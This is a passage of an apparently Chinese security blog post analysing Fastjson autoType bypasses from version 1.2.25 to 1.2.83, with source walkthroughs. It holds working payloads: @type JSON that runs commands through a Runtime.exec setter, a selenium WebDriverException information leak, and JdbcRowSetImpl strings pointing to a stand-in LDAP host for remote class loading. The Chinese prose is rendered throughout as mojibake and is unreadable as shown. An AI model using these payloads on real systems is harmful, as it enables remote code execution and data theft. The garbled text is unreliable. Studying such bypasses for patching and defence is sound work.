int)</code></p><p>è¿™ä¸ªæ–¹æ³•ä¸€ç›´åœ¨å˜ï¼Œä½†æ˜¯è¿™é‡Œå´ä¸å¤§å½±å“ç†è§£æ­¤ç±»çš„è¿™ä¸ªç‰ˆæœ¬çš„ç»•è¿‡æ–¹æ³•ï¼Œå·²çŸ¥è¯¥æ–¹æ³•æœ€ç»ˆè¿”å›Classï¼Œä¹Ÿå°±æ˜¯@typeæŒ‡å®šçš„ç±»ï¼Œå¹¶ä¸”æ£€æµ‹æ˜¯å¦æ˜¯æ¶æ„ç±»ï¼Œæ‰€ä»¥æ­¤å¤„çš„ç›®çš„å°±æ˜¯è®©checkAutoTypeæˆåŠŸåŠ è½½æƒ³è¦åŠ è½½çš„ç±»ï¼šå·²çŸ¥æƒ³è¦å®ŒæˆåŠ è½½ç±»çš„æ–¹å¼æœ‰ï¼š</p><blockquote><ol><li>ç™½åå•                                â€”-&gt; âç™½åå•ä¸å¯æ§</li><li>ç¼“å­˜è¡¨ä¸­å­˜åœ¨                    â€”-&gt; âç¼“å­˜è¡¨å¯„äº†</li><li>æœ‰å¯¹åº”ååºåˆ—åŒ–å™¨çš„ç±»     â€”-&gt; âå†™æ­»çš„ï¼ŒåŠ¨ä¸äº†</li><li>ä½¿ç”¨äº† JSONType æ³¨è§£     â€”-&gt; âå¼€å‘è‡ªå·±å†™çš„ï¼ŒåŠ¨ä¸äº†</li><li>æœ‰expectClassï¼ŒæœŸæœ›ç±»    â€”-&gt; âå¦‚æœå¯æ§ï¼Œåˆ™æœ‰ä¸€å®šå¯èƒ½</li></ol></blockquote><p>è¿™é‡Œç¨å¾®è¯´ä¸€ä¸‹è‡ªå·±ç†è§£çš„<code>expectClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parseObject(s,Person.class);<span class="hljs-comment">// æ¯”å¦‚æ­¤å¤„çš„Person.classå°±æ˜¯expectClass</span><br><span class="hljs-comment">// å½“ç„¶éœ€è¦å­—ç¬¦ä¸²sä¸­å¸¦æœ‰@typeæ—¶æ‰ä¼šèµ°åˆ°checkAutoType(),æ‰èƒ½å¤Ÿçœ‹åˆ°expectClassä¸ä¸ºç©º</span><br><span class="hljs-comment">// é€šå¸¸æƒ…å†µä¸‹ï¼šexpectClasséƒ½æ˜¯ä¸ºnullçš„</span><br></code></pre></td></tr></table></figure><p>å†æ¥çœ‹ä¸€ä¸‹ä¸ºå•¥<code>expectClass</code>å¯æ§æ—¶ï¼Œæœ‰å¯èƒ½å®ç°ç±»åŠ è½½</p><p><img src="/2022/11/19/FastjsonBypass/15.png"></p><p>åœ¨æ¥çœ‹<code>expectClassFlag</code>çš„å€¼æ˜¯å“ªæ¥çš„</p><p><img src="/2022/11/19/FastjsonBypass/16.png"></p><p>å†æ¥çœ‹æœŸæœ›ç±»<code>expectClass</code>æ˜¯æ€ä¹ˆæ¥çš„ï¼Œå·²çŸ¥ç›´æ¥<code>parseObject()</code>èµ°åˆ°<code>checkAutoType()</code>æ—¶ï¼Œ</p><p>ä¹Ÿå°±æ˜¯åœ¨<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>é‡Œé¢æ—¶<code>expectClass</code>æ˜¯é»˜è®¤ä¸ºç©ºçš„ï¼Œæ‰€ä»¥å¾—çœ‹å…¶ä»–åœ°æ–¹è°ƒç”¨çš„<code>checkAutoType()</code></p><p>æ¯”å¦‚ï¼š<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></p><p><img src="/2022/11/19/FastjsonBypass/17.png"></p><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„åœ°æ–¹ï¼Œä¹Ÿæœ‰å¯èƒ½å¯ä»¥åˆ©ç”¨ï¼Œè¿™é‡Œæ‹¿ç€ä½œä¸ºå­¦ä¹ ä¾‹å­ï¼Œå·²çŸ¥è¯¥æ–¹æ³•æ˜¯åœ¨ä½¿ç”¨<code>JavaBeanDeserializer</code>è¿™ä¸ªååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–æ—¶è°ƒç”¨<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></p><p>è€Œ<code>JavaBeanDeserializer</code>è¿™ä¸ªååºåˆ—åŒ–å™¨æ˜¯åœ¨ååºåˆ—åŒ–æŸäº›ç±»çš„æ—¶å€™ä½¿ç”¨ï¼Œå…·ä½“å¯ä»¥çœ‹<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>è¿™ä¸ªæ–¹æ³•ï¼ˆè·å–ä»€ä¹ˆæ ·çš„ååºåˆ—åŒ–å™¨ï¼Œç”±è¯¥æ–¹æ³•å†³å®šï¼‰</p><p>å›åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>åœ¨å®Œæˆ<code>checkAutoType</code>ã€è·å–åˆ°<code>JavaBeanDeserializer</code>è¿™ä¸ªååºåˆ—åŒ–å™¨åï¼Œæ‰§è¡Œååºåˆ—åŒ–</p><p><img src="/2022/11/19/FastjsonBypass/18.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, // å°è£…çš„JSONå­—ç¬¦ä¸²å’Œä¸€äº›å…¶ä»–ä¸œè¥¿</span></span><br><span class="hljs-params"><span class="hljs-function">                               Type type, // <span class="hljs-meta">@type</span>æŒ‡å®šçš„é‚£ä¸ªç±»</span></span><br><span class="hljs-params"><span class="hljs-function">                               Object fieldName, // <span class="hljs-keyword">null</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               Object object, // <span class="hljs-keyword">null</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">int</span> features, //<span class="hljs-number">0</span></span></span><br><span class="hljs-params"><span class="hljs-function">                               <span class="hljs-keyword">int</span>[] setFlags)</span> </span>&#123;<span class="hljs-comment">// null</span><br>             <br>    ...<span class="hljs-comment">// å¿½ç•¥ä¸€äº›</span><br>                <span class="hljs-keyword">if</span> (!matchField) &#123;<span class="hljs-comment">// matchFieldé»˜è®¤ä¸ºfalse</span><br>                    key = lexer.scanSymbol(parser.symbolTable);<span class="hljs-comment">// æ‰«æç‰¹æ®Šç¬¦å·</span><br>                    ...<span class="hljs-comment">// å†å¿½ç•¥ä¸€äº›ä»£ç </span><br><br>                    <span class="hljs-keyword">if</span> ((typeKey != <span class="hljs-keyword">null</span> &amp;&amp; typeKey.equals(key))<br>                            || JSON.DEFAULT_TYPE_KEY == key) &#123;<span class="hljs-comment">// å½“keyä¸º@typeæ—¶è¿›å…¥ï¼Œå…¶ä»–ä¸¤ä¸ªå°±ä¸è¯´äº†</span><br>                        lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);<br>                        <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>                            String typeName = lexer.stringVal();<span class="hljs-comment">// è·å–@typeåçš„å€¼</span><br>                            lexer.nextToken(JSONToken.COMMA);<br><br>                            <span class="hljs-keyword">if</span> (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) &#123;<span class="hljs-comment">// å½“å‰@typeåçš„å€¼ï¼Œä¸ä¹‹å‰@typeåçš„å€¼ç›¸ç­‰æ—¶è¿›å…¥</span><br>                                <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;<br>                                    lexer.nextToken();<br>                                    <span class="hljs-keyword">break</span>;<br>                                &#125;<br>                                <span class="hljs-keyword">continue</span>;<br>                            &#125;<br>                            <br><span class="hljs-comment">// ç›´æ¥å°±è¿”å›ç©ºäº†ï¼Œå› ä¸ºæ²¡æœ‰ç”¨JSONTypeæ³¨è§£</span><br>                            ObjectDeserializer deserializer = getSeeAlso(config, <span class="hljs-keyword">this</span>.beanInfo, typeName);<br>                            Class&lt;?&gt; userType = <span class="hljs-keyword">null</span>;<br><br>                            <span class="hljs-keyword">if</span> (deserializer == <span class="hljs-keyword">null</span>) &#123;<br>                                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);<span class="hljs-comment">// typeä¸ºä¼ å…¥çš„ä¸€ä¸ªå‚æ•°</span><br>                                <span class="hljs-comment">// æ­¤æ—¶expectClassä¸ä¸ºç©º</span><br>                                userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());<br>                                deserializer = parser.getConfig().getDeserializer(userType);<br>                                <span class="hljs-comment">// è·å–ç›¸åº”çš„ååºåˆ—åŒ–å™¨</span><br>                            &#125;<br><span class="hljs-comment">// è¿›è¡Œååºåˆ—åŒ–</span><br>                            Object typedObject = deserializer.deserialze(parser, userType, fieldName);<br>                            <br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œè¿™é‡Œçš„<code>expectClass</code>æ¥æºç®—æ˜¯ææ¸…æ¥šäº†</p><p>å¹¶ä¸”è¿™é‡Œåœ¨é€šè¿‡checkAutoTypeä¹‹åï¼Œå°±è¿›è¡Œäº†ååºåˆ—åŒ–ï¼ŒåŸºæœ¬ä¸Šçš„æµç¨‹éƒ½èµ°å®Œäº†</p><p>æ‹ä¸€ä¸‹è¿™ä¸ªç»•è¿‡æ€è·¯ï¼š</p><blockquote><ol><li>checkAutoTypeæ–¹æ³•ä¸­ï¼Œå½“expectClassä¸ä¸ºç©ºæ—¶ï¼Œä¼šå¯¹æŒ‡å®šç±»è¿›è¡ŒåŠ è½½</li><li>å½“æŒ‡å®šçš„ç±»æ˜¯æœŸæœ›ç±»çš„å­ç±»æˆ–å®ç°ç±»æ—¶èƒ½å¤ŸæˆåŠŸè¿”å›</li><li>å½“ä¼ å…¥çš„ç¬¬1ä¸ª@typeæ‰€æŒ‡å®šçš„ç±»ä½¿ç”¨<code>JavaBeanDeserializer</code>è¿™ä¸ªååºåˆ—åŒ–å™¨ï¼Œå¹¶ä¸”åœ¨åé¢åˆå‡ºç°ä¸€ä¸ª@typeæ—¶ï¼Œä¼šå†æ¬¡æ‰§è¡ŒcheckAutoTypeï¼Œå¹¶ä¸”æ­¤æ—¶expectClassä¸ºç¬¬1ä¸ª@typeæ‰€æŒ‡å®šçš„ç±»</li><li>æ‰€ä»¥ï¼Œæ‰¾ä¸€ä¸ªç±»æˆ–æ¥å£ï¼Œå…¶æœ¬èº«æˆ–å­ç±»ç­‰ä¸­å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„ç‚¹</li></ol></blockquote><p>è¿™é‡Œä»¥<code>java.lang.AutoCloseable</code>ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">AutoCloseable</span></span>&#123;<br>    <br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>    <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.mechoy.Test&quot;</span>,<br>    <span class="hljs-attr">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;calc&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/19.png"></p><p>åˆ°æ­¤è¿™ä¸ªç»•è¿‡å°±ç®—æ˜¯æ•´æ˜ç™½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ©ç”¨é“¾äº†ï¼Œè¿™é‡Œè‡ªå·±è¿˜ä¸å’‹å¤ªä¼šæ‰¾ï¼Œå°±å…ˆçœ‹çœ‹å¤§ä½¬ä»¬çš„ï¼Œå­¦ä¹ å­¦ä¹ ï¼Œå‘å¤§ä½¬ä»¬è‡´æ•¬ğŸ«¡</p><p>è¿™é‡Œå°±å¤ç°ä¸€ä¸ªç®€å•çš„ä¸œè¥¿å§ï¼Œæœ‰ä¸ªä¾èµ–ï¼Œç„¶ååˆ©ç”¨çš„ç‚¹ä¹Ÿä¸æ˜¯<code>java.lang.AutoCloseable</code>ï¼Œè€Œæ˜¯<code>java.lang.Exception</code>ï¼ŒåŸç†ç±»ä¼¼ï¼Œåªä¸è¿‡ä»£ç ä¸å¤ªä¸€æ ·ï¼Œä½†ä¸å½±å“ç†è§£</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>selenium-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Exception&quot;</span>, <span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.openqa.selenium.WebDriverException&quot;</span>,<span class="hljs-attr">&quot;$ref&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç®€æï¼š</p><ol><li>java.lang.Exceptionè¯¥ç±»å­˜åœ¨äºç¼“å­˜è¡¨ä¸­</li><li>org.openqa.selenium.WebDriverExceptionè¿™ä¸ªç±»ä¼šè¾“å‡ºä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼ŒåŒæ—¶è¯¥ç±»åˆå®ç°äº†Exceptionæ¥å£</li><li>org.openqa.selenium.WebDriverExceptionè¯¥ç±»åŠå…¶çˆ¶ç±»ä¸­æœ‰ä¸€äº›ç¬¦åˆæ¡ä»¶çš„getteræ–¹æ³•</li><li>fastjsonæ”¯æŒå¾ªç¯å¼•ç”¨ï¼Œå¹¶ä¸”æ˜¯ç¼ºçœæ‰“å¼€çš„ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨$refå»è°ƒç”¨getteræ–¹æ³•</li></ol></blockquote><p><img src="/2022/11/19/FastjsonBypass/20.png"></p><p><img src="/2022/11/19/FastjsonBypass/21.png"></p><p>æ‰€ä»¥å½“åœºæ™¯æµ‹è¯•ä»£ç å¦‚ä¸‹æƒ…å†µæ—¶ï¼Œå…¶å®ä¹Ÿä¸éœ€è¦$ref</p><p><img src="/2022/11/19/FastjsonBypass/22.png"></p><p>å½“ç„¶çœŸå®åœºæ™¯è‚¯å®šå„ç§å„æ ·çš„ï¼Œè‚¯å®šä¸ä¼šåƒè¿™ä¹ˆç®€å•ï¼Œè‚¯å®šéœ€è¦æ ¹æ®å„ç§å„æ ·çš„å®é™…æƒ…å†µæ¥è¿›è¡Œä¿®æ”¹</p><h4 id="1-2-69-1-2-80"><a href="#1-2-69-1-2-80" class="headerlink" title="1.2.69 - 1.2.80"></a>1.2.69 - 1.2.80</h4><p>å…ˆæä¸€ä¸‹åŸæ¥çš„ä¾‹å­ï¼Œçœ‹ä¸€ä¸‹æŠ›ä»€ä¹ˆå¼‚å¸¸</p><p><img src="/2022/11/19/FastjsonBypass/23.png"></p><p>åˆä¸æ”¯æŒäº†ï¼Œçœ‹ä¸€ä¸‹ä»£ç æ˜¯å“ªé‡Œçš„é—®é¢˜ï¼Œè¿™é‡ŒexpectClassFlagçš„åˆ¤æ–­å¤„å¢åŠ äº†<code>java.lang.AutoCloseable</code>çš„hashå€¼ï¼Œå¯¼è‡´expectClassFlagä¸ºfalseï¼Œç„¶åä¸‹é¢çš„é‚£ä¸ªç±»åŠ è½½çš„åœ°æ–¹å°±è¿›ä¸å»äº†ï¼Œç„¶åå°±æŠ¥å¼‚å¸¸å–½</p><p><img src="/2022/11/19/FastjsonBypass/24.png"></p><p>è¿™é‡Œè¿˜æ˜¯è¦è¦å›åˆ°ä¸Šé¢çš„<code>java.lang.Exception</code>ä¸­</p><p>åœ¨<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªï¼Œè¿™é‡Œä¼ å…¥çš„æ˜¯<code>java.lang.Throwable</code></p><p><img src="/2022/11/19/FastjsonBypass/25.png"></p><p>å†æ¥çœ‹ä¸€ä¸‹ä½•ç§æƒ…å†µä¸‹ä¼šå¾—åˆ°è¿™ä¸ªååºåˆ—åŒ–å™¨</p><p><img src="/2022/11/19/FastjsonBypass/27.png"></p><p><code>java.lang.Throwable</code>çš„ç±»å›¾</p><p><img src="/2022/11/19/FastjsonBypass/26.png"></p><p>ä¸‹é¢å°±è·Ÿ1.2.68çš„ç»•è¿‡æ€è·¯æ˜¯ä¸€æ ·çš„äº†ï¼Œä¹Ÿå°±æ²¡å•¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ‰€ä»¥æ”¹ä¸€ä¸‹æµ‹è¯•ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String cmd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCmd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCmd</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">this</span>.cmd = cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/28.png"></p><p>ç„¶åå°±æ˜¯æ‰¾åˆ©ç”¨é“¾äº†</p><h4 id="1-2-83"><a href="#1-2-83" class="headerlink" title="1.2.83"></a>1.2.83</h4><p>çœ‹ä¸€ä¸‹è¿™ä¸ªæ˜¯æ€ä¿®å¤çš„ï¼Œå°±æ˜¯åœ¨checkAutoTypeä¸­åŠ äº†ä¸ªif</p><p><img src="/2022/11/19/FastjsonBypass/44.png"></p><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>&lt;=1.2.47æ—¶ä½¿ç”¨çš„æ˜¯ç¼“å­˜ï¼š</p><blockquote><p>1.å½“æ˜ å°„è¡¨ä¸­å­˜åœ¨è¯¥ç±»çš„Classç±»å‹æ—¶ï¼Œfastjsonè®¤ä¸ºè¯¥ç±»å·²ç»åŠ è½½è¿‡äº†ï¼Œæ˜¯æ¯”è¾ƒå®‰å…¨çš„ï¼š</p><p>â€‹    å¯¹åº”ä»£ç <code>TypeUtils.getClassFromMapping(typeName)</code>ï¼Œæ‰€ä»¥è‹¥èƒ½å¤Ÿå°†æ¶æ„çš„ç±»çš„classæ·»åŠ è‡³ç¼“å­˜è¡¨ä¸­ï¼Œåˆ™å¯ä»¥è·³è¿‡<code>checkAutoType</code>ï¼Œåœ¨<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>ä¸­å­˜åœ¨å‘ç¼“å­˜è¡¨ä¸­æ·»åŠ æ•°æ®çš„é€»è¾‘ï¼Œå¹¶ä¸”<strong>å‚æ•°1</strong>å°±æ˜¯ç±»å</p><ol start="2"><li>fastjsonå¯¹ä¸€äº›ç±»æä¾›äº†ä¸“å±çš„ååºåˆ—åŒ–å™¨ï¼Œä¾‹å¦‚<code>java.lang.Class</code>â€”&gt; <code>MiscCodec</code></li><li>è¿™äº›ç±»ä¹Ÿæ˜¯å¯ä»¥è·³è¿‡checkAutoTypeæ£€æµ‹çš„</li><li>åœ¨<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>ï¼Œå½“ååºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ª<code>java.lang.Class</code>ç±»å‹æ—¶ï¼Œä¼šæ¥æ”¶<code>val</code>å‚æ•°ï¼Œå¹¶è°ƒç”¨<code>TypeUtils#loadClass(val,ClassLoader)</code></li><li>å¦‚æœæ­¤æ—¶valçš„å€¼æ˜¯æ¶æ„ç±»çš„ç±»åï¼Œåˆ™ä¼šå°†è¯¥æ¶æ„ç±»çš„å…¨ç±»åæ·»åŠ è‡³ç¼“å­˜è¡¨</li><li>æ­¤æ—¶å†å°†æ¶æ„ç±»ä¼ å…¥ï¼Œå°±èƒ½è·³è¿‡checkAutoTypeçš„æ£€æµ‹</li></ol></blockquote><p>&lt;=1.2.80æ—¶ä½¿ç”¨çš„expectClass</p><blockquote><ol><li><p>checkAutoTypeå½“expectClassä¸ä¸ºç©ºæ—¶ï¼Œå¹¶ä¸”å½“å‰ç±»ä¸åœ¨é»‘åå•ä¸­ï¼Œä¸”è¯¥ç±»æ˜¯expectClassçš„å­ç±»æˆ–å®ç°ç±»å°±å¯ä»¥å®ç°åŠ è½½ã€</p></li><li><p>å…¶ä¸­åœ¨JavaBeanDeserializerå’ŒThrowableDeserializerä¸­æœ‰è°ƒç”¨checkAutoTypeï¼Œå¹¶ä¸”ä¹Ÿä¸ä¸ºç©º</p></li><li><p>æ‰€ä»¥å°±æ˜¯å…ˆä¼ å…¥ä¸€ä¸ªç±»ï¼Œä½¿å…¶è·å–çš„ååºåˆ—åŒ–å™¨æ˜¯ä¸Šé¢ä¸¤ç§ï¼Œç„¶åå†æ¥@typeï¼Œå†ä¼ å…¥æ¶æ„ç±»ï¼Œå…·ä½“æµç¨‹è¿˜æ˜¯è¦çœ‹ä»£ç </p></li><li><p>è¿™ç§å°±å¯ä»¥å®ç°ç»•è¿‡checkAutoTypeï¼Œç„¶åå°±æ˜¯æ‰¾åˆ©ç”¨é“¾äº†</p></li></ol></blockquote><h3 id="0x02-å¼€å¯AutoType"><a href="#0x02-å¼€å¯AutoType" class="headerlink" title="0x02 å¼€å¯AutoType"></a>0x02 å¼€å¯AutoType</h3><p>fastjsoné»˜è®¤æ˜¯ä¸å¼€å¯AutoTypeï¼Œå¼€å¯çš„è¯éœ€è¦æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-keyword">true</span>);<span class="hljs-comment">// IDEAä¼šçˆ†çº¢ï¼Œä½†é—®é¢˜ä¸å¤§ï¼Œå¯ä»¥è·‘</span><br></code></pre></td></tr></table></figure><h4 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h4><p>è¯¥ç‰ˆæœ¬å¢åŠ äº†checkAutoTypeï¼Œå¹¶ä¸”å¢åŠ äº†é»‘ç™½åå•ï¼Œé»‘åå•è§é™„å½•ï¼Œç™½åå•é»˜è®¤ä¸ºç©º</p><p>åˆ¤æ–­æ˜¯å¦ä¸ºé»‘åå•ä¸­çš„ç±»æ¯”è¾ƒæ–¹æ³•ä¸º<code>className.startsWith(accept)</code>é€šè¿‡é»‘åå•æ ¡éªŒä¹‹åï¼Œè°ƒç”¨<code>TypeUtils.loadClass()</code>è¿›è¡Œç±»åŠ è½½ï¼Œæ¥åˆ°å…³é”®ç‚¹ï¼Œå› ä¸ºjavaå¯¹å…¨ç±»åæœ‰ä¸€äº›ä¸åŒçš„å†™æ³•ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨è¿›è¡Œç±»åŠ è½½çš„åŒæ—¶åˆ é™¤äº†ä¸€äº›ä¸åŒçš„å†™æ³•</p><ol><li>[ â€”&gt; æ•°ç»„ç±»çš„å†™æ³•</li><li>Lxxx; â€”&gt; å¦ä¸€ç§å…¨ç±»åå†™æ³•</li></ol><p><img src="/2022/11/19/FastjsonBypass/29.png"></p><blockquote><ol><li>ç”±äºæ£€éªŒé»‘åå•çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯å­—ç¬¦ä¸²çš„å†…å®¹æ ¡éªŒï¼Œæ‰€ä»¥ä½¿ç”¨ä¸åŒçš„å…¨ç±»åå†™æ³•å³å¯ç»•è¿‡é»‘åå•</li><li>ä¸åŒçš„å†™æ³•åœ¨ç±»åŠ è½½çš„ä¹‹å‰ä¼šåˆ é™¤æ‰ï¼Œæ‰€ä»¥åŒæ ·èƒ½å¤Ÿå®ç°ç±»åŠ è½½</li></ol></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://xxx&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://xxx&quot;</span>,<span class="hljs-attr">&quot;AutoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;]&#125;<br><span class="hljs-comment">// éœ€è¦æ³¨æ„ç¬¬äºŒpocçš„é€—å·é—®é¢˜</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/30.png"></p><h4 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h4><p>1.2.42ç‰ˆæœ¬æ—¶ï¼Œå¼€å§‹é‡‡ç”¨hashå€¼è¿›è¡Œé»‘åå•æ 